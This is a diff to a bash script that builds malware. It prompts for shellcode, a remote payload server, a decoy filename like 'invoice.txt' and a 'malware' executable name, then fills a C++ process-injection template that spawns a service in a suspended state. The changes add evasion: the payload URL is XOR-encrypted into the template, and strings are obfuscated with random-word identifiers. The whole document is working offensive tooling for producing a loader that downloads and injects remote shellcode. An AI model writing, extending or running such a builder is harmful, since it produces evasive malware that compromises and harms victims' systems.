@@ -36,21 +36,25 @@ echo -e ${green}"Enter The Path To Your Shellcode File. ex: /home/user/Downloads
 echo ""
 read Shellcode
 echo ""
-echo -e ${green}"What's The IP Of Your Payload Server?"${clear}
+echo -e ${green}"What's The Domain Or IP Of Your Payload Server? include http(s)://"${clear}
 echo ""
 read HOSTIP
+#HOSTIP=http://192.168.1.30
 echo ""
 echo -e ${green}"Enter The Port Of Your Payload Server"${clear}
 echo ""
 read PORTY
+#PORTY=8080
 echo ""
 echo -e ${green}"Name Your Shellcode File. ex: invoice.txt"${clear}
 echo ""
 read SHELLCODEFILE
+#SHELLCODEFILE=calc.txt
 echo ""
 echo -e ${green}"Name Your Malware! ex: malware.exe"${clear}
 echo ""
 read MALWARE
+#MALWARE=calc.exe
 echo ""
 cp template.cpp Resources/template.cpp
 echo -e "${green}Enter The Service You Want To Spawn In A Suspended State${clear}"
@@ -80,6 +84,22 @@ SPAWN=$(cat string.txt)
 sed -i "s/SPAWN/$SPAWN/g" Resources/template.cpp
 
 
+ntde="RandomL"
+# Loop through each character in the input string and construct the array declaration
+output_array=""
+for ((i=0; i<${#CREATETOOL}; i++)); do
+    # Append each character to the output array
+    output_array+=" '${CREATETOOL:$i:1}',"
+done
+
+# Add a null terminator and close the array
+output_array+=" 0x0 };"
+
+# Print the final array declaration
+printf "unsigned char ${ntde}[] = {${output_array}\n" > string.txt
+SPAWN=$(cat string.txt)
+sed -i "s/CREATETOOL/$CREATETOOL/g" Resources/template.cpp
+
 # Use a static name for NtDe
 ntde="RandomK"
 
@@ -98,7 +118,6 @@ printf "unsigned char ${ntde}[] = {${output_array}\n" > string.txt
 INJ3CT=$(cat string.txt)
 sed -i "s/INJ3CT/$INJ3CT/g" Resources/template.cpp
 
-rm string.txt
 
 echo -e ${yellow}"+++Encrypting Payload+++" ${clear}
 echo ""
@@ -129,14 +148,10 @@ python3 Resources/con.py
 #rm Resources/con.py
 mv payload.bin $SHELLCODEFILE
 sleep 2
-
-#Replace IP, PORT and SHELLCODEFILE
-sed -i "s/HOSTIP/$HOSTIP/g" Resources/template.cpp
 sed -i "s/PORTY/$PORTY/g" Resources/template.cpp
+#echo "Port"
 sed -i "s/SHELLCODEFILE/$SHELLCODEFILE/g" Resources/template.cpp
-#Replacing Values
 
-#sed -i "s/HOSTIP/$HOSTIP/g" Resources/template.cpp
 input_file="/usr/share/dict/words"
 output_file="/usr/share/dict/words_no_apostrophes"
 template_file="Resources/template.cpp"
@@ -147,9 +162,39 @@ sed "s/'//g" "$input_file" > "$output_file"
 
 # Replace placeholders in the template.cpp file with different random sentences
 for placeholder in Random{1..9} Random{A..Z}; do
-    RandomSentence=$(grep -v "'" "$output_file" | shuf -n 20 | tr '\n' '_' | sed 's/_$//')
+    RandomSentence=$(grep -v "'" "$output_file" | shuf -n 3 | tr '\n' '_' | sed 's/_$//')
     sed -i "s/$placeholder/$RandomSentence/g" "$template_file"
 done
+
+
+cp xor.py Resources/xor.py
+
+# Remove apostrophes and save to the output file
+RandomSentence=$(grep -v "'" "$output_file" | shuf -n 3 | tr '\n' '_')
+RandomSentence=$(echo "$RandomSentence" | sed 's/_$//')
+
+echo "$RandomSentence" > random_sentence.txt
+
+# Read the contents of the random_sentence.txt into xfile
+xfile=$(cat random_sentence.txt)
+
+# Use sed to replace XKEYVAL in xor.py and template.cpp
+sed -i "s/XKEYVAL/$xfile/g" Resources/xor.py
+sed -i "s/XKEYVAL/$xfile/g" Resources/template.cpp
+
+echo "$HOSTIP:$PORTY/$SHELLCODEFILE" > file.txt
+
+# Encrypt the content of file.txt
+python3 Resources/xor.py file.txt > encrypted_url.txt
+
+# Read the encrypted URL from encrypted_url.txt
+encrypted_url=$(cat encrypted_url.txt)
+
+# Replace the encrypted URL in template.cpp
+sed -i "s/WEBSITE/$encrypted_url/g" Resources/template.cpp
+rm file*
+rm string.txt
+rm encrypted*
 echo -e ${yellow}"+++Strings Replaced By Sentences+++"${clear}
 #Compile
 echo ""
